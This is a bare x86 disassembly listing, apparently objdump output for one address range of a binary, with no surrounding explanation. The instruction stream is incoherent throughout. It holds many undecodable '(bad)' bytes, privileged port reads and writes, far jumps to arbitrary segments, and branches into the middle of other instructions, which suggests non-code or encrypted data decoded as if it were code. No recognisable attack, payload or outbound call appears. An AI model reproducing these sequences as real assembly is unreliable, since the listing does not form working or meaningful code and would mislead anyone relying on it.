  415d4f:	mov    ebx,0xa71a5b82
  415d54:	cdq    
  415d55:	les    ebx,FWORD PTR [edx-0x34eff90e]
  415d5b:	repz xor al,BYTE PTR [edx+0x56]
  415d5f:	mov    cl,0xc6
  415d61:	xchg   ebx,eax
  415d62:	frstor [eax-0x3b]
  415d65:	jle    0x415de5
  415d67:	pop    eax
  415d68:	loope  0x415d25
  415d6a:	pop    edx
  415d6b:	movd   DWORD PTR [edi-0x1c0c6f2e],mm7
  415d72:	add    eax,0x38efe9fb
  415d77:	and    bh,BYTE PTR [ebx-0x70701ee0]
  415d7d:	adc    bl,BYTE PTR [esi+0x7728cfa1]
  415d83:	aas    
  415d84:	pop    ebx
  415d85:	inc    ebp
  415d86:	or     BYTE PTR [eax+0x7d],bl
  415d89:	aad    0x99
  415d8b:	js     0x415dd7
  415d8d:	fs stos DWORD PTR es:[edi],eax
  415d8f:	jmp    0xaeac6d2e
  415d94:	das    
  415d95:	ins    DWORD PTR es:[edi],dx
  415d96:	sti    
  415d97:	and    esp,DWORD PTR [edx]
  415d99:	or     ebx,DWORD PTR [eax]
  415d9b:	(bad)  
  415d9d:	sbb    eax,0x31926bf3
  415da2:	das    
  415da3:	dec    edx
  415da4:	lahf   
  415da5:	sub    eax,0x8b0496b6
  415daa:	int    0x50
  415dac:	daa    
  415dad:	out    0xe6,eax
  415daf:	(bad)  
  415db1:	popf   
  415db2:	jecxz  0x415d8c
  415db4:	sub    BYTE PTR [edi+0x1fe22542],bh
  415dba:	(bad)  
  415dbb:	mov    edi,0xf9efd9eb
  415dc0:	or     BYTE PTR [esi-0x3f],cl
  415dc3:	sbb    al,0xcd
  415dc5:	or     DWORD PTR [esi-0x572697c0],0xffffff95
  415dcc:	out    0x86,eax
  415dce:	adc    bl,BYTE PTR [edx]
  415dd0:	mov    eax,esp
  415dd2:	cmp    al,0xb7
  415dd4:	loopne 0x415e1e
  415dd6:	pop    ss
  415dd7:	ja     0x415da4
  415dd9:	inc    ebp
  415dda:	leave  
  415ddb:	inc    edi
  415ddc:	mov    ecx,0x6bee3643
  415de1:	aam    0x85
  415de3:	sahf   
  415de4:	mov    esp,0xf00abec4
  415de9:	and    bl,BYTE PTR [ebx+0x6f]
  415dec:	test   BYTE PTR [esi-0xeacf61f],al
  415df2:	lea    eax,[eax]
  415df4:	retf   0xd35a
  415df7:	cmp    eax,0x19ff4c3a
  415dfc:	mov    eax,0xb380bcf5
  415e01:	push   cs
  415e02:	pop    esi
  415e03:	ret    
  415e04:	das    
  415e05:	iret   
  415e06:	dec    ebx
  415e07:	in     al,dx
  415e08:	dec    ecx
  415e09:	xchg   esp,eax
  415e0a:	out    dx,eax
  415e0b:	pop    eax
  415e0c:	pop    eax
  415e0d:	xchg   esi,eax
  415e0e:	add    al,0x75
  415e10:	mov    ds:0x195f1554,al
  415e15:	out    0x94,eax
  415e17:	xchg   edx,eax
  415e18:	push   cs
  415e19:	ss aam 0xbb
  415e1c:	lahf   
  415e1d:	cld    
  415e1e:	pop    edi
  415e1f:	jge    0x415e72
  415e21:	je     0x415dc7
  415e23:	jg     0x415df1
  415e25:	aaa    
  415e26:	xchg   BYTE PTR [ecx+0x5a],bl
  415e29:	icebp  
  415e2a:	pop    eax
  415e2b:	jmp    0x9d0e:0x67a4bb59
  415e32:	les    ecx,FWORD PTR [ebp+eiz*4-0x3217fc95]
  415e39:	pop    ecx
  415e3a:	push   ss
  415e3b:	xchg   edx,eax
  415e3c:	cmp    al,0x3a
  415e3e:	and    ebx,ebp
  415e40:	into   
  415e41:	outs   dx,DWORD PTR ds:[esi]
  415e42:	add    esi,DWORD PTR [ebx]
  415e44:	sar    BYTE PTR [eax],cl
  415e46:	xchg   DWORD PTR [ebp+0x2b09e4a9],eax
  415e4c:	pushf  
  415e4d:	enter  0x17e6,0x7
  415e51:	loopne 0x415e35
  415e53:	mov    ch,BYTE PTR [eax+0x1fbd7e6]
  415e59:	sbb    BYTE PTR [ebx-0xd],0xc8
  415e5d:	fild   QWORD PTR [ecx+0x39]
  415e60:	fsubr  QWORD PTR [esi+0x5d]
  415e63:	push   edi
  415e64:	jmp    0x415e16
  415e66:	leave  
  415e67:	clc    
  415e68:	sub    DWORD PTR [eax-0xc],esi
  415e6b:	mov    BYTE PTR [esi-0x511beae4],bl
  415e71:	push   ebx
  415e72:	aam    0x66
  415e74:	cmp    BYTE PTR [ebx+0x2bee567b],dh
  415e7a:	xor    ecx,DWORD PTR [si+0x31]
  415e7e:	jmp    0xe31c:0x6f398546
  415e85:	sbb    eax,0x4a41b131
  415e8a:	mov    al,0x6b
  415e8c:	call   0xd40ab2a5
  415e91:	stc    
  415e92:	pop    ds
  415e93:	inc    ecx
  415e94:	dec    ebp
  415e95:	mov    ds:0x2ecfca16,al
  415e9a:	aam    0x3d
  415e9c:	leave  
  415e9d:	(bad)  
  415e9e:	cwde   
  415e9f:	push   edi
  415ea0:	js     0x415e5f
  415ea2:	sbb    al,0xf5
  415ea4:	cmp    bh,al
  415ea6:	mov    BYTE PTR [esp+eax*2+0xb],al
  415eaa:	xchg   ebx,eax
  415eab:	sbb    DWORD PTR [eax],0xaeaaf9f2
  415eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb2:	es test eax,0x6668b1af
  415eb8:	mov    dh,0xfc
  415eba:	mov    eax,ds:0x914d1ff0
  415ebf:	cli    
  415ec0:	popf   
  415ec1:	add    edi,DWORD PTR [eax-0x7ea8c2e0]
  415ec7:	push   ds
  415ec8:	pushf  
  415ec9:	(bad)  
  415eca:	push   eax
  415ecb:	sbb    al,0x8c
  415ecd:	jp     0x415eae
  415ecf:	enter  0x8a65,0x11
  415ed3:	mov    ds:0x829eb25f,eax
  415ed8:	test   BYTE PTR [esi-0x59],dl
  415edb:	sbb    DWORD PTR es:0x22b7a8b7,edi
  415ee2:	aaa    
  415ee3:	dec    esi
  415ee4:	inc    esp
  415ee5:	sub    al,0x8e
  415ee7:	outs   dx,BYTE PTR ds:[esi]
  415ee8:	jecxz  0x415e93
  415eea:	in     eax,0x72
  415eec:	mov    al,0x64
  415eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eef:	loop   0x415e85
  415ef1:	cmp    bh,BYTE PTR [ecx+0x3a6d4b83]
  415ef7:	jle    0x415f70
  415ef9:	lahf   
  415efa:	in     al,0x78
  415efc:	jbe    0x415f23
  415efe:	mov    dl,0x5c
  415f00:	sub    BYTE PTR [edi+0x68],dl
  415f03:	mov    edx,0x86f16570
  415f08:	(bad)  
  415f09:	jae    0x415eab
  415f0b:	cmp    eax,0x4e2f9e79
  415f10:	pusha  
  415f11:	inc    eax
  415f12:	fnstcw WORD PTR [eax+0x68245fb9]
  415f18:	jnp    0x415f1c
  415f1a:	jecxz  0x415f07
  415f1c:	neg    DWORD PTR [ebx+0x2d]
  415f1f:	dec    edx
  415f20:	outs   dx,BYTE PTR ds:[esi]
  415f21:	add    DWORD PTR [eax+ebp*8],0xffffff9c
  415f25:	ret    
  415f26:	mov    ah,bl
  415f28:	xor    al,0xa9
  415f2a:	push   ebp
  415f2b:	or     cl,bl
  415f2d:	pop    edi
  415f2e:	xchg   edi,eax
  415f2f:	push   cs
  415f30:	sub    ah,dh
  415f32:	pop    ds
  415f33:	fcomp  DWORD PTR [ebx+0x2dbda70]
  415f39:	ins    DWORD PTR es:[edi],dx
  415f3a:	inc    edx
  415f3b:	sub    esi,DWORD PTR [edx]
  415f3d:	neg    al
  415f3f:	push   edi
  415f40:	xchg   BYTE PTR [eax-0x663cdbc0],dl
  415f46:	fwait
  415f47:	push   esp
  415f48:	cs cli 
  415f4a:	and    eax,0xb6eee626
  415f4f:	add    ch,BYTE PTR [edx]
  415f51:	add    eax,0x84418956
  415f56:	push   cs
  415f57:	rcr    ebx,0x1b
  415f5a:	mov    eax,ds:0xe0100f4b
  415f5f:	mov    bh,0xda
  415f61:	add    BYTE PTR [eax+0x37],bl
  415f64:	push   0x57
  415f66:	push   ecx
  415f67:	jmp    0xacc44fba
  415f6c:	ret    0xcccc
  415f6f:	mov    al,ds:0xd1affd5a
  415f74:	add    BYTE PTR [ebp-0x77],bh
  415f77:	pop    ecx
  415f78:	shl    edi,1
  415f7a:	inc    eax
  415f7b:	aas    
  415f7c:	shl    edi,0xb4
  415f7f:	pop    ds
  415f80:	xor    eax,0xabd38f79
  415f85:	and    DWORD PTR [edx+eiz*2],edx
  415f88:	sahf   
  415f89:	arpl   WORD PTR [ecx],bx
  415f8b:	jae    0x415f20
  415f8d:	jg     0x415f60
  415f8f:	inc    edx
  415f90:	(bad)  
  415f91:	or     al,0xe6
  415f93:	sti    
  415f94:	cwde   
  415f95:	xchg   esi,eax
  415f96:	mov    WORD PTR [eax+0x20],cs
  415f99:	push   cs
  415f9a:	div    BYTE PTR [edx+eax*8]
  415f9d:	jno    0x415fa5
  415f9f:	xor    al,0x43
  415fa1:	retf   
  415fa2:	cmp    eax,0x61f911cb
  415fa7:	fmul   st,st(1)
  415fa9:	push   0x11b9f209
  415fae:	and    ebx,edi
  415fb0:	jmp    0x2692:0x17e47df4
  415fb7:	loop   0x415f8c
  415fb9:	pop    ecx
  415fba:	outs   dx,DWORD PTR ds:[esi]
  415fbb:	mov    ebp,0x3885efba
  415fc0:	fimul  WORD PTR [ebp-0xc]
  415fc3:	xor    esp,DWORD PTR [edx+0x35]
  415fc6:	add    DWORD PTR [edi-0xb],0xf4742639
  415fcd:	push   0xd3fb64b7
  415fd2:	xor    al,0x35
  415fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fd5:	sbb    BYTE PTR [ecx-0x65c0fe4],ch
  415fdb:	or     dh,BYTE PTR [eax+ebp*4-0x74]
  415fdf:	aad    0x63
  415fe1:	(bad)  
  415fe2:	push   ebp
  415fe3:	xchg   DWORD PTR [ebx-0x4],ecx
  415fe6:	mov    esi,0x140aa538
  415feb:	mov    edi,0xc0ba5695
  415ff0:	jmp    0xc846:0xd5cafd30
  415ff7:	xor    BYTE PTR [ebp-0x1c],dl
  415ffa:	xchg   ebp,eax
  415ffb:	jl     0x41602e
  415ffd:	call   0x47d368e7
  416002:	dec    esi
  416003:	in     eax,0x71
  416005:	jno    0x416030
  416007:	push   0x66b011e7
  41600c:	dec    ebx
  41600d:	and    ebx,DWORD PTR [edi+0x2d13d307]
  416013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416014:	jns    0x416084
  416016:	dec    ebx
  416017:	push   0xfffffff2
  416019:	icebp  
  41601a:	test   al,0xe6
  41601c:	add    dl,BYTE PTR [edi+0x707cf1de]
  416022:	and    DWORD PTR [esi],eax
  416024:	loope  0x415fb1
  416026:	bound  esi,QWORD PTR [ebx]
  416028:	inc    eax
  416029:	and    BYTE PTR [eax-0x453d28ad],al
  41602f:	loopne 0x416036
  416031:	lds    esp,FWORD PTR [edx]
  416033:	xchg   esp,eax
  416034:	outs   dx,BYTE PTR ds:[esi]
  416035:	test   al,0x14
  416037:	xor    ecx,edi
  416039:	pop    ds
  41603a:	test   al,0x65
  41603c:	mov    bl,0x65
  41603e:	retf   
  41603f:	and    DWORD PTR [edx],0xae836fad
  416045:	mov    ebp,0xfeb347b4
  41604a:	jno    0x415ff1
  41604c:	mov    esp,0xc6e993f6
  416051:	cmp    ah,ch
  416053:	popf   
  416054:	adc    eax,0x1e8e8375
  416059:	pusha  
  41605a:	xchg   ebx,ebp
  41605c:	retf   
  41605d:	and    BYTE PTR [edx+0x685a50fe],al
  416063:	aad    0x34
  416065:	sbb    dh,BYTE PTR [edi-0x18]
  416068:	cwde   
  416069:	retf   0xfe1e
  41606c:	push   eax
  41606d:	arpl   sp,ax
  41606f:	in     eax,0x83
  416071:	in     eax,dx
  416072:	jecxz  0x4160a0
  416074:	xor    eax,0x4c75adbf
  416079:	(bad)  
  41607a:	push   ebp
  41607b:	sahf   
  41607c:	cmp    eax,esi
  41607e:	mov    ds:0xcb751f04,al
  416083:	mov    ds:0x9221509e,al
  416088:	and    eax,0xef6200ab
  41608d:	into   
  41608e:	scas   eax,DWORD PTR es:[edi]
  41608f:	scas   al,BYTE PTR es:[edi]
  416090:	sub    al,0x7
  416092:	imul   edi,DWORD PTR [esp+ecx*2-0x9b77f63],0x9a2e2287
  41609d:	mov    eax,ds:0x3894d030
  4160a2:	mov    ah,0xfa
  4160a4:	cs shl edi,cl
  4160a7:	and    al,cl
  4160a9:	mov    al,0xdf
  4160ab:	inc    edi
  4160ac:	mov    eax,0xce8fb123
  4160b1:	test   al,0xc8
  4160b3:	or     eax,DWORD PTR [edi+0x383f6b36]
  4160b9:	sar    DWORD PTR [ecx+edi*8+0x23c4c91f],0xda
  4160c1:	pop    es
  4160c2:	nop
  4160c3:	cmp    BYTE PTR [edi+0x69],ch
  4160c6:	xchg   DWORD PTR [ebx+0x53],esi
  4160c9:	add    bl,dh
  4160cb:	imul   eax,esi,0x2d
  4160ce:	scas   al,BYTE PTR es:[edi]
  4160cf:	jo     0x4160e4
  4160d1:	lods   al,BYTE PTR ds:[esi]
  4160d2:	and    dh,bh
  4160d4:	test   al,0xd9
  4160d6:	xchg   DWORD PTR [ecx+0x55],esp
  4160d9:	stc    
  4160da:	cld    
  4160db:	das    
  4160dc:	fwait
  4160dd:	leave  
  4160de:	mov    eax,DWORD PTR [ebx-0x5b]
  4160e1:	aad    0x8b
  4160e3:	and    al,0x4e
  4160e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e6:	adc    BYTE PTR [edi],0x1f
  4160e9:	ficom  DWORD PTR [esi+edi*4-0x4c]
  4160ed:	jo     0x4160dc
  4160ef:	ds inc edx
  4160f1:	mov    edi,0xa629e9de
  4160f6:	push   cs
  4160f7:	push   ebx
  4160f8:	stc    
  4160f9:	inc    ecx
  4160fa:	jp     0x416165
  4160fc:	fist   DWORD PTR ds:[ebp+0x6f]
  416100:	pop    ds
  416101:	sar    edx,cl
  416103:	iret   
  416104:	mov    bh,0x2a
  416106:	mov    dh,0xe5
  416108:	mov    WORD PTR [edi-0xb0cff4a],fs
  41610e:	sahf   
  41610f:	mov    eax,esi
  416111:	mov    edi,0xcfe98d45
  416116:	mov    bh,0x43
  416118:	push   esp
  416119:	daa    
  41611a:	sbb    ah,BYTE PTR [ebx+0x604a427b]
  416120:	stos   BYTE PTR es:[edi],al
  416121:	imul   BYTE PTR [eax+0x26]
  416124:	imul   ecx,esp,0x19
  416127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416128:	pop    esp
  416129:	arpl   WORD PTR [ebx],si
  41612b:	pop    es
  41612c:	mov    cl,0xa
  41612e:	inc    esp
  41612f:	add    DWORD PTR [ecx],esi
  416131:	cs out 0x60,al
  416134:	mov    ds:0xc2a5c413,eax
  416139:	jne    0x416120
  41613b:	xchg   BYTE PTR [edi+0x20f2a071],dh
  416141:	cs mov dh,0xeb
  416144:	sub    eax,DWORD PTR [esi]
  416146:	into   
  416147:	sub    ah,BYTE PTR [ebx+0xa45127e]
  41614d:	in     al,0xa5
  41614f:	push   ebx
  416150:	mov    bl,0x86
  416152:	xchg   ebx,eax
  416153:	xor    al,0xa1
  416155:	in     eax,dx
  416156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416157:	xor    esp,DWORD PTR [ebp-0x6226e806]
  41615d:	into   
  41615e:	aaa    
  41615f:	data16 ds mov dh,0xbd
  416163:	sub    edx,DWORD PTR [ebp+0x2aaf8a55]
  416169:	dec    esp
  41616a:	mov    ebx,0x5a3842c5
  41616f:	popf   
  416170:	push   ecx
  416171:	mov    ss,WORD PTR [eax-0x55e36f48]
  416177:	push   ecx
  416178:	cs or  eax,0xdf5be3d9
  41617e:	loopne 0x4161f8
  416180:	add    esp,DWORD PTR [edx+0x6a]
  416183:	add    al,0x7d
  416185:	dec    edx
  416186:	mov    ds:0x7b930425,eax
  41618b:	push   cx
  41618d:	jae    0x4161f4
  41618f:	stos   BYTE PTR es:[edi],al
  416190:	lea    edi,[edx+0x22]
  416193:	xlat   BYTE PTR ds:[ebx]
  416194:	push   ebx
  416195:	sahf   
  416196:	(bad)  
  416197:	fcomp  QWORD PTR [edx]
  416199:	lahf   
  41619a:	mov    bl,0x92
  41619c:	stc    
  41619d:	mov    ebx,ebp
  41619f:	pop    esi
  4161a0:	jne    0x41612d
  4161a2:	ins    DWORD PTR es:[edi],dx
  4161a3:	push   ss
  4161a4:	out    dx,eax
  4161a5:	xor    eax,0x5e
  4161a8:	jge    0x416183
  4161aa:	ror    ecx,1
  4161ac:	xchg   ebx,eax
  4161ad:	push   edx
  4161ae:	dec    DWORD PTR [ecx+0x5b]
  4161b1:	lahf   
  4161b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b3:	jo     0x41622a
  4161b5:	mov    ebp,0x1586452b
  4161ba:	jmp    0x77337bfd
  4161bf:	jo     0x41622d
  4161c1:	iret   
  4161c2:	inc    eax
  4161c3:	pop    esp
  4161c4:	sahf   
  4161c5:	retf   
  4161c6:	fchs   
  4161c8:	ret    0x7622
  4161cb:	or     DWORD PTR [ebp+0x40d28ad3],eax
  4161d1:	fidivr WORD PTR [ecx+0x47]
  4161d4:	cmp    ch,BYTE PTR [edi+eax*4-0x221909f6]
  4161db:	repnz outs dx,DWORD PTR es:[esi]
  4161de:	xchg   esp,eax
  4161df:	enter  0xf060,0x44
  4161e3:	cmc    
  4161e4:	cmp    dl,BYTE PTR [ecx-0x78e8a3f1]
  4161ea:	mov    bh,0xc1
  4161ec:	push   ss
  4161ed:	mov    WORD PTR [ecx-0x63],fs
  4161f0:	inc    esi
  4161f1:	stos   BYTE PTR es:[edi],al
  4161f2:	inc    edx
  4161f3:	mov    WORD PTR [ebp-0x215d017b],ds
  4161f9:	dec    eax
  4161fa:	mov    dl,0xfc
  4161fc:	pop    esp
  4161fd:	sub    DWORD PTR [edi+0xa],esi
  416200:	repz sub cl,bl
  416203:	dec    edx
  416204:	fstp   DWORD PTR [edx-0x7e97a3af]
  41620a:	jb     0x416242
  41620c:	pop    ebp
  41620d:	xchg   esp,eax
  41620e:	in     al,0xa0
  416210:	(bad)  
  416211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416212:	in     eax,0x96
  416214:	ss ss push es
  416217:	ja     0x4161ce
  416219:	pop    edi
  41621a:	not    BYTE PTR [ecx]
  41621c:	jne    0x416290
  41621e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41621f:	cli    
  416220:	arpl   WORD PTR cs:[edx],cx
  416223:	jno    0x416217
  416225:	iret   
  416226:	les    ecx,FWORD PTR [ebx+0x22]
  416229:	out    0x81,eax
  41622b:	mov    gs,esp
  41622d:	jle    0x416296
  41622f:	fiadd  DWORD PTR [ecx+eiz*8+0x7cc70e48]
  416236:	adc    al,0xbc
  416238:	jns    0x41628b
  41623a:	xchg   DWORD PTR [ecx-0x6238da68],ebx
  416240:	mov    BYTE PTR [edx+eax*4+0x40],ch
  416244:	push   esp
  416245:	or     al,0x8b
  416247:	pop    es
  416248:	and    al,0xb9
  41624a:	cmovae ebp,esp
  41624d:	pop    es
  41624e:	sbb    al,0xcf
  416250:	test   eax,0x77d58fce
  416255:	stos   BYTE PTR es:[edi],al
  416256:	ins    BYTE PTR es:[edi],dx
  416257:	ds jmp 0x4161fd
  41625a:	xchg   BYTE PTR ds:[edx],al
  41625d:	jnp    0x416239
  41625f:	loope  0x416252
  416261:	mov    ch,0xb1
  416263:	dec    ebp
  416264:	in     eax,0x88
  416266:	push   ecx
  416267:	jecxz  0x416246
  416269:	icebp  
  41626a:	xchg   edi,eax
  41626b:	jle    0x416259
  41626d:	stos   DWORD PTR es:[edi],eax
  41626e:	push   es
  41626f:	out    dx,al
  416270:	xlat   BYTE PTR ds:[ebx]
  416271:	clc    
  416272:	xchg   BYTE PTR ds:0xdee92942,ch
  416278:	mov    al,0x63
  41627a:	stos   BYTE PTR es:[edi],al
  41627b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41627c:	iret   
  41627d:	cmp    BYTE PTR [esp+esi*2],ah
  416280:	data16 add al,0x50
  416283:	pop    DWORD PTR [edx]
  416285:	test   DWORD PTR [ebx+0x30],eax
  416288:	push   cs
  416289:	push   cs
  41628a:	mov    ah,0xd9
  41628c:	mov    bh,0x21
  41628e:	ret    
  41628f:	jl     0x416274
  416291:	jmp    0x41629b
  416293:	add    DWORD PTR cs:[ebx],ebx
  416296:	(bad)  
  416297:	dec    eax
  416298:	adc    al,0xe0
  41629a:	adc    BYTE PTR ds:0xba3ade9e,bh
  4162a0:	dec    esi
  4162a1:	inc    ebx
  4162a2:	dec    ecx
  4162a3:	in     eax,0xc4
  4162a5:	mov    cl,0x2d
  4162a7:	daa    
  4162a8:	fistp  QWORD PTR [edi+0x2a891b53]
  4162ae:	xchg   esp,eax
  4162af:	jne    0x416303
  4162b1:	arpl   bp,bp
  4162b3:	push   es
  4162b4:	jne    0x416318
  4162b6:	or     DWORD PTR [ebx+0x8824f1f],eax
  4162bc:	repnz pop ds
  4162be:	adc    BYTE PTR [ebx+edx*8-0x63],dl
  4162c2:	ins    DWORD PTR es:[edi],dx
  4162c3:	sti    
  4162c4:	sub    cl,ah
  4162c6:	mov    ebp,DWORD PTR [ebp-0x79]
  4162c9:	adc    al,0xa3
  4162cb:	push   cs
  4162cc:	aaa    
  4162cd:	mov    ah,0x94
  4162cf:	test   al,0x86
  4162d1:	cdq    
  4162d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d3:	(bad)  
  4162d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d6:	pop    edx
  4162d7:	pop    esi
  4162d8:	data16 jbe 0x41626d
  4162db:	cmp    DWORD PTR [esi+0x4f6c500d],0xffffffa3
  4162e2:	xchg   ebx,eax
  4162e3:	repnz xchg esp,eax
  4162e5:	xchg   esp,eax
  4162e6:	mov    dl,0x38
  4162e8:	inc    ecx
  4162e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162ea:	adc    al,0x33
  4162ec:	int    0x22
  4162ee:	fcom   QWORD PTR [edi]
  4162f0:	sbb    dl,ch
  4162f2:	es cli 
  4162f4:	std    
  4162f5:	push   ss
  4162f6:	xchg   ebp,eax
  4162f7:	in     eax,dx
  4162f8:	dec    edi
  4162f9:	xor    DWORD PTR [esi+esi*4],eax
  4162fc:	pop    ebp
  4162fd:	aas    
  4162fe:	ret    0xcd0
  416301:	push   esi
  416302:	jge    0x4162a9
  416304:	retf   0x3e1f
  416307:	divps  xmm6,XMMWORD PTR [edi]
  41630a:	lahf   
  41630b:	imul   ecx,DWORD PTR [eax-0x17],0xfce307cb
  416312:	lods   al,BYTE PTR ds:[esi]
  416313:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  416316:	sbb    bh,bh
  416318:	pop    esi
  416319:	push   0xffffffe3
  41631b:	pop    ebp
  41631c:	pop    eax
  41631d:	and    DWORD PTR [edi],0xffffffbf
  416320:	dec    ecx
  416321:	add    ch,BYTE PTR [ebp-0x7750f66a]
  416327:	adc    eax,eax
  416329:	mov    es,WORD PTR [esi+ecx*2]
  41632c:	mov    ebx,0xacef7e0f
  416331:	or     BYTE PTR [edi+ebx*1-0x77],ch
  416335:	dec    dh
  416337:	sbb    al,0x5b
  416339:	ret    
  41633a:	clc    
  41633b:	scas   al,BYTE PTR es:[edi]
  41633c:	pop    ss
  41633d:	push   edi
  41633e:	jmp    0x4163b6
  416340:	daa    
  416341:	inc    ebx
  416342:	loope  0x41633d
  416344:	add    dh,BYTE PTR [ebx]
  416346:	mov    ebp,0xf074c469
  41634b:	sbb    BYTE PTR [edx+0x68ff259e],0xfe
  416352:	xor    esp,DWORD PTR [ebx]
  416354:	add    eax,0x883d75c9
  416359:	sub    DWORD PTR [ecx],ebx
  41635b:	call   0x4e91:0x8041f33d
  416362:	inc    ecx
  416363:	or     ebp,DWORD PTR [edx]
  416365:	add    bl,bh
  416367:	pop    ebp
  416368:	daa    
  416369:	and    ecx,DWORD PTR [ecx]
  41636b:	and    dl,BYTE PTR [edi+0x8434d93]
  416371:	pop    es
  416372:	aam    0x20
  416374:	into   
  416375:	adc    ch,dh
  416377:	cli    
  416378:	aad    0x3e
  41637a:	mov    ah,BYTE PTR [ecx+0x49d607b2]
  416380:	inc    edi
  416381:	ds imul eax,esp,0x391f7a18
  416388:	mov    dl,0x9
  41638a:	jnp    0x416379
  41638c:	nop
  41638d:	rcl    DWORD PTR ds:0x29c45731,1
  416393:	inc    edx
  416394:	xor    ah,ah
  416396:	dec    ebp
  416397:	es cld 
  416399:	mov    eax,ds:0x84f0be24
  41639e:	scas   eax,DWORD PTR es:[edi]
  41639f:	jge    0x416415
  4163a1:	fadd   st,st(5)
  4163a3:	mul    BYTE PTR [ecx-0x4a]
  4163a6:	jg     0x41640c
  4163a8:	fiadd  DWORD PTR [ebp+0x3b]
  4163ab:	push   eax
  4163ac:	adc    BYTE PTR [ecx],0xc5
  4163af:	into   
  4163b0:	xor    edi,edi
  4163b2:	in     eax,0x1f
  4163b4:	cmp    eax,0xe9bde3ea
  4163b9:	scas   al,BYTE PTR es:[edi]
  4163ba:	call   0x785f173f
  4163bf:	dec    edi
  4163c0:	lods   al,BYTE PTR ds:[esi]
  4163c1:	mov    BYTE PTR [edx],dh
  4163c3:	pop    ss
  4163c4:	js     0x4163dd
  4163c6:	xchg   cl,bh
  4163c8:	retf   0x66f4
  4163cb:	jl     0x4163a8
  4163cd:	mov    esi,0xba3998c5
  4163d2:	push   ebx
  4163d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d5:	sbb    DWORD PTR [ebp+edx*8+0x7af1e55],edi
  4163dc:	add    al,0x6c
  4163de:	pushf  
  4163df:	bound  ecx,QWORD PTR [ecx]
  4163e1:	ret    
  4163e2:	mov    ch,0x7b
  4163e4:	gs (bad) 
  4163e6:	out    dx,eax
  4163e7:	adc    esp,DWORD PTR [ebx-0xbb1dfe6]
  4163ed:	ds sbb eax,0x9d86be3e
  4163f3:	(bad)  
  4163f4:	shl    DWORD PTR [ebp+0x382fc9eb],1
  4163fa:	or     eax,0x2ee84dd9
  4163ff:	aas    
  416400:	xchg   esi,eax
  416401:	add    eax,0xa46f6d0a
  416406:	inc    edi
  416407:	out    0x35,eax
  416409:	xor    ch,BYTE PTR [ebp-0x59]
  41640c:	inc    ebp
  41640d:	jmp    0xb0d7:0x581eaefa
  416414:	or     DWORD PTR [edx+0x36],eax
  416417:	jmp    0x378d:0xe9905ed7
  41641e:	pop    ss
  41641f:	xchg   ebp,eax
  416420:	(bad)  
  416421:	mov    dh,0xd3
  416423:	pop    ds
  416424:	dec    BYTE PTR [ebp+0x43d501f9]
  41642a:	clc    
  41642b:	sahf   
  41642c:	fcomp  st(7)
  41642e:	mov    edx,0x377bde22
  416433:	jo     0x416460
  416435:	gs ret 
  416437:	repz dec eax
  416439:	pusha  
  41643a:	push   0x6
  41643c:	push   0xffffff93
  41643e:	mov    bh,BYTE PTR [eax+0xce08474]
  416444:	nop
  416445:	fprem  
  416447:	xchg   esi,eax
  416448:	sbb    BYTE PTR [ecx+0xd9f9044],ah
  41644e:	xchg   esp,eax
  41644f:	in     al,dx
  416450:	fdivr  st(7),st
  416452:	mov    bl,0x46
  416454:	push   es
  416455:	in     eax,0x67
  416457:	jmp    0x41643f
  416459:	mov    esp,0xebae60e3
  41645e:	lds    eax,FWORD PTR [edx+ebp*1-0x20]
  416462:	xchg   DWORD PTR [ebp-0x6d31c799],edx
  416468:	mov    BYTE PTR [ebx],al
  41646a:	mov    cl,0x2d
  41646c:	lods   eax,DWORD PTR ds:[esi]
  41646d:	inc    esi
  41646e:	push   es
  41646f:	inc    eax
  416470:	aas    
  416471:	mov    eax,ds:0x863ac4bc
  416476:	pop    esp
  416477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416478:	adc    eax,0x896ce0f7
  41647d:	inc    esi
  41647e:	dec    ecx
  41647f:	cs jbe 0x416404
  416482:	test   DWORD PTR [ebp-0x56],esi
  416485:	fidivr WORD PTR [ebx-0x3]
  416488:	add    DWORD PTR [esi-0x7e],0x4940d2ba
  41648f:	add    al,0x42
  416491:	fiadd  DWORD PTR [edx+edx*4-0x3b]
  416495:	xor    BYTE PTR [ebp+0x62],ch
  416498:	cwde   
  416499:	mov    eax,0x1ddf7d65
  41649e:	xchg   BYTE PTR [ebx],dh
  4164a0:	mov    esp,0xb21790cb
  4164a5:	pop    esp
  4164a6:	icebp  
  4164a7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4164a9:	add    DWORD PTR [edi],eax
  4164ab:	(bad)  
  4164ac:	xchg   esi,eax
  4164ad:	push   cs
  4164ae:	lahf   
  4164af:	ins    BYTE PTR es:[edi],dx
  4164b0:	pop    ecx
  4164b1:	cmp    DWORD PTR [edi+esi*8-0x50f79cd9],0x69
  4164b9:	lods   eax,DWORD PTR ds:[esi]
  4164ba:	adc    edx,eax
  4164bc:	fucom  st(1)
  4164be:	cmp    esi,ebx
  4164c0:	cmc    
  4164c1:	sbb    eax,0x88cc3ba9
  4164c6:	popf   
  4164c7:	push   eax
  4164c8:	mov    eax,DWORD PTR [ecx]
  4164ca:	mov    dh,0x24
  4164cc:	aam    0x9d
  4164ce:	pop    eax
  4164cf:	ins    BYTE PTR es:[edi],dx
  4164d0:	push   eax
  4164d1:	add    al,BYTE PTR [edi-0x5d]
  4164d4:	int    0x7c
  4164d6:	and    al,0xd
  4164d8:	int    0x33
  4164da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
